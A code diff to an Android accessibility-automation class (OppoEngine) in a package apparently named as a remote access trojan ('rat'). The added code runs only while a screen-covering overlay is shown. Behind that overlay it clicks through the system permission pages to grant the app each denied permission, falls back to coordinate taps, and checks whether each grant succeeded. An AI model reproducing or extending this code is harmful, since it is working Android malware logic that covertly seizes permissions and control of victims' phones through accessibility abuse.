@@ -91,6 +91,7 @@ public class OppoEngine extends AutoEngine {
     private final List<WindowMatcher> dialogWins = new ArrayList<>();
 
     private String appName; // ADAPT: vendor 从配置获取
+    private final java.util.Set<String> skippedPermissions = new java.util.HashSet<>();
 
     public OppoEngine() {
         super(buildAllMatchers(), SETTINGS);
@@ -193,11 +194,14 @@ public class OppoEngine extends AutoEngine {
      */
     private boolean k0() {
         if (!matchesAny(appDetailWins)) return false;
-        UiNode root = k();
-        if (root == null) return false;
+        activateRoot(); UiNode root = k();
+        if (root == null) { Log.d(TAG, "k0: root is null"); return false; }
         String targetName = Objects.equals(keepAliveType.get(), KA_MAIN)
             ? getAppName() : getBackupAppName();
-        return GkdSelectorHelper.findOne(root, "TextView[text*=\"" + GkdSelectorHelper.escapeForSelector(targetName) + "\"]") != null;
+        String selector = "TextView[text*=\"" + GkdSelectorHelper.escapeForSelector(targetName) + "\"]";
+        UiNode found = GkdSelectorHelper.findOne(root, selector);
+        Log.d(TAG, "k0: targetName=" + targetName + " selector=" + selector + " found=" + (found != null));
+        return found != null;
     }
 
     /**
@@ -244,10 +248,15 @@ public class OppoEngine extends AutoEngine {
     protected void onEventSafe(AccessibilityEvent event, String packageName,
                                 String className) {
         // vendor u():445-446 — super.u() 电池优化对话框
+        // 遮罩守卫: 仅在遮罩显示期间执行自动化 (对齐 HuaweiEngine)
+        if (!com.vendor.rat.helper.BlockViewHelper.isShowing()) {
+            return;
+        }
         if (event != null) {
             checkBatteryOptimizationDialog();
         }
 
+        Log.d(TAG, "onEventSafe: pkg=" + packageName + " cls=" + className + " matchesAppDetail=" + matchesAny(appDetailWins));
         boolean inAppDetail = k0();
 
         if (inAppDetail) {
@@ -768,17 +777,31 @@ public class OppoEngine extends AutoEngine {
                 }
             }
 
+            String permName = extractPermName(deniedRow);
             deniedRow.click();
             sleep(1500);
             activateRoot();
 
-            if (selectBestAllowOption()) {
-                granted++;
-                Log.d(TAG, "权限管理: 已授权第 " + granted + " 个权限");
-            }
+            selectBestAllowOption();
 
             performBack();
             sleep(1000);
+
+            // 回到列表后检查该权限是否仍为"不允许"，如果是则跳过（dispatchGesture 可能返回 true 但实际无效）
+            if (permName != null) {
+                activateRoot();
+                UiNode checkRoot = k();
+                if (checkRoot != null) {
+                    UiNode stillDenied = findPermByName(checkRoot, permName);
+                    if (stillDenied != null) {
+                        Log.w(TAG, "权限管理: " + permName + " 仍为不允许，跳过");
+                        skippedPermissions.add(permName);
+                    } else {
+                        granted++;
+                        Log.d(TAG, "权限管理: 已授权第 " + granted + " 个权限");
+                    }
+                }
+            }
             updateProgress(75 + Math.min(granted * 2, 20));
         }
 
@@ -807,6 +830,7 @@ public class OppoEngine extends AutoEngine {
             for (String s : SKIP_PERMISSIONS) {
                 if (s.equals(permName)) { skip = true; break; }
             }
+            if (!skip && skippedPermissions.contains(permName)) { skip = true; }
             if (skip) {
                 Log.d(TAG, "权限管理: 跳过 " + permName);
                 continue;
@@ -836,21 +860,38 @@ public class OppoEngine extends AutoEngine {
         return null;
     }
 
+    /** 在权限列表中查找指定名称且状态为"不允许"的权限行 */
+    private UiNode findPermByName(UiNode root, String name) {
+        List<UiNode> denied = GkdSelectorHelper.findAll(root, "TextView[text=\"不允许\"]");
+        if (denied == null) return null;
+        for (UiNode d : denied) {
+            UiNode row = d.findClickableParent();
+            if (row == null) continue;
+            String pn = extractPermName(row);
+            if (name.equals(pn)) return row;
+        }
+        return null;
+    }
+
     /**
      * 在权限子页面选择最高优先级的允许选项
      */
     private boolean selectBestAllowOption() {
-        UiNode root = k();
+        // dump 所有窗口信息到日志
+        dumpAllWindowRoots();
+
+        // 遍历所有窗口找 permissioncontroller 的 root
+        UiNode root = findPermissionControllerRoot();
         if (root == null) {
-            Log.d(TAG, "权限管理: root is null, 尝试坐标点击 (PermissionController)");
+            Log.d(TAG, "权限管理: 无法获取权限页面 root, 尝试坐标点击");
             return clickAllowByCoordinate();
         }
 
         String pkg = root.getPackageName();
-        if (pkg != null && (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller"))) {
-            Log.d(TAG, "权限管理: PermissionController 页面, 用坐标点击");
-            return clickAllowByCoordinate();
-        }
+        Log.d(TAG, "权限管理: selectBestAllowOption root pkg=" + pkg);
+
+        // dump root 的子节点树（只打印前3层）
+        dumpNodeTree(root, 0, 3);
 
         for (String allowText : ALLOW_PRIORITY) {
             UiNode row = GkdSelectorHelper.findOne(root,
@@ -861,9 +902,74 @@ public class OppoEngine extends AutoEngine {
                 sleep(500);
                 return true;
             }
+            Log.d(TAG, "权限管理: 未匹配 '" + allowText + "'");
         }
-        Log.w(TAG, "权限管理: 未找到允许选项");
-        return false;
+        Log.w(TAG, "权限管理: 未找到允许选项, 尝试坐标点击");
+        return clickAllowByCoordinate();
+    }
+
+    private void dumpAllWindowRoots() {
+        com.vendor.rat.service.MyAccessibilityService svc = com.vendor.rat.service.MyAccessibilityService.getInstance();
+        if (svc == null) { Log.d(TAG, "dumpWindows: svc null"); return; }
+        try {
+            java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = svc.getWindows();
+            if (windows == null) { Log.d(TAG, "dumpWindows: windows null"); return; }
+            Log.d(TAG, "dumpWindows: " + windows.size() + " windows");
+            for (int i = 0; i < windows.size(); i++) {
+                android.view.accessibility.AccessibilityWindowInfo w = windows.get(i);
+                if (w == null) continue;
+                android.view.accessibility.AccessibilityNodeInfo wRoot = w.getRoot();
+                String pkg = wRoot != null ? String.valueOf(wRoot.getPackageName()) : "null";
+                Log.d(TAG, "  window[" + i + "] type=" + w.getType() + " pkg=" + pkg + " active=" + w.isActive() + " title=" + w.getTitle());
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "dumpWindows error", e);
+        }
+    }
+
+    private void dumpNodeTree(UiNode node, int depth, int maxDepth) {
+        if (node == null || depth >= maxDepth) return;
+        String indent = new String(new char[depth * 2]).replace('\0', ' ');
+        String cls = node.getClassName();
+        String text = node.getText();
+        String desc = node.getContentDescription();
+        boolean clickable = node.isClickable();
+        Log.d(TAG, "  UI:" + indent + cls
+            + (text != null && !text.isEmpty() ? " text=\"" + text + "\"" : "")
+            + (desc != null && !desc.isEmpty() ? " desc=\"" + desc + "\"" : "")
+            + (clickable ? " [clickable]" : ""));
+        java.util.List<UiNode> children = node.getChildren();
+        if (children != null) {
+            for (UiNode child : children) {
+                dumpNodeTree(child, depth + 1, maxDepth);
+            }
+        }
+    }
+
+    private UiNode findPermissionControllerRoot() {
+        com.vendor.rat.service.MyAccessibilityService svc = com.vendor.rat.service.MyAccessibilityService.getInstance();
+        if (svc == null) return null;
+        try {
+            java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = svc.getWindows();
+            if (windows != null) {
+                for (android.view.accessibility.AccessibilityWindowInfo w : windows) {
+                    if (w == null) continue;
+                    android.view.accessibility.AccessibilityNodeInfo wRoot = w.getRoot();
+                    if (wRoot == null) continue;
+                    CharSequence pkg = wRoot.getPackageName();
+                    if (pkg != null && (pkg.toString().contains("permissioncontroller")
+                            || pkg.toString().contains("packageinstaller"))) {
+                        Log.d(TAG, "findPermissionControllerRoot: found " + pkg);
+                        return new UiNode(wRoot);
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "findPermissionControllerRoot error", e);
+        }
+        // fallback
+        activateRoot();
+        return k();
     }
 
     /**
